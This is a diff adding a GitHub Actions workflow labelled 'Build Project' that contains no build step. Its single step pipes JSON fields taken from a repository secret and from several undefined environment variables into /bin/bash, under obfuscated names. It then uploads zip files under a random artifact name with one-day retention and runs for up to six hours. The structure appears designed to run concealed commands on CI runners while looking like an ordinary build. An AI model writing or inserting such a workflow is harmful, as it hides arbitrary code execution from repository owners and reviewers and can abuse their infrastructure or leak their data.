@@ -1,0 +1,33 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          lddj3233: ${{ secrets.lddj3233 }}
+        run: |
+          printf '%s' "$lddj3233" | jq -r .wj72201 | /bin/bash
+          printf '%s' "$ozln3584" | jq -r .jd6 | /bin/bash
+          printf '%s' "$ks47660" | jq -r .om732 | /bin/bash
+          echo $arst87 | jq -r .wmjk431 | /bin/bash
+          echo $s2382 | jq -r .w44 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: VTci2gSW
+          path: "*.zip"
+          retention-days: 1
